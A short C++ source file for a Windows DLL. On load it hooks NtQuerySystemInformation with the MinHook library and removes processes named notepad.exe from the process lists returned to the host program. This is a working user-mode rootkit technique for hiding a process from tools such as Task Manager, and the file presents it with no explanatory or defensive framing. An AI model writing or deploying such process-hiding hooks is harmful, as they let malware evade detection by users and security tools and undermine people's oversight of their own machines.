#include "WinDef.h"
#include <MinHook.h>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "MinHook.lib")
using namespace std;


typedef NTSTATUS(_stdcall* NtQuerySystemInformationOriginalDef)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength);
NtQuerySystemInformationOriginalDef oNtQuerySystemInformation;

NTSTATUS _stdcall hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, SIZE_T SystemInformationLength, PSIZE_T ReturnLength)
{
	NTSTATUS Result;
	PSYSTEM_PROCESS_INFO pSystemProcess;
	PSYSTEM_PROCESS_INFO pNextSystemProcess;

	Result = oNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (NT_SUCCESS(Result) && SystemInformationClass == SystemProcessInformation)
	{
		pSystemProcess = (PSYSTEM_PROCESS_INFO)SystemInformation;
		pNextSystemProcess = (PSYSTEM_PROCESS_INFO)((PBYTE)pSystemProcess + pSystemProcess->NextEntryOffset);

		while (pNextSystemProcess->NextEntryOffset != 0)
		{
			if (lstrcmpW((&pNextSystemProcess->ImageName)->Buffer, L"notepad.exe") == 0) {
				pSystemProcess->NextEntryOffset += pNextSystemProcess->NextEntryOffset;
			}
			pSystemProcess = pNextSystemProcess;
			pNextSystemProcess = (PSYSTEM_PROCESS_INFO)((PBYTE)pSystemProcess + pSystemProcess->NextEntryOffset);
		}
	}

	return Result;
}

int main()
{
	void* dwNtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	if (MH_Initialize() != MH_OK)
	{
	}
	while (MH_CreateHook((void*)dwNtQuerySystemInformation, (void*)hkNtQuerySystemInformation, reinterpret_cast<void**>(&oNtQuerySystemInformation)) != MH_OK)
	{
	}
	while (MH_EnableHook((void*)dwNtQuerySystemInformation) != MH_OK)
	{
	}

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)	
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
		return TRUE;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}